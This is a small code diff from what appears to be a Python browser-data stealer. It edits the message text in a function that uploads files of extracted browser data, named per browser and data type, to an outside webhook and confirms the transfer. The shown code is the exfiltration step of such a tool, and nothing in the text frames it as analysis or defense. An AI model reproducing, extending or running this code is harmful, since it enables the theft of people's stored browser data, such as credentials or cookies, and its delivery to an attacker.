@@ -76,7 +76,7 @@ def save_results_and_send(browser_name, type_of_data, content):
 def send_to_webhook(file_path, browser_name, data_type):
     with open(file_path, 'rb') as f:
         response = requests.post(webhook_url, files={"file": (f"{browser_name}_{data_type}.txt", f)},
-                                 data={"content": f"Extracted {data_type} from {browser_name}"})
+                                 data={"content": f"#{browser_name}'s {data_type}: "})
         if response.status_code == 200:
             print(f"\t [*] Successfully sent {file_path} to webhook.")
         else:
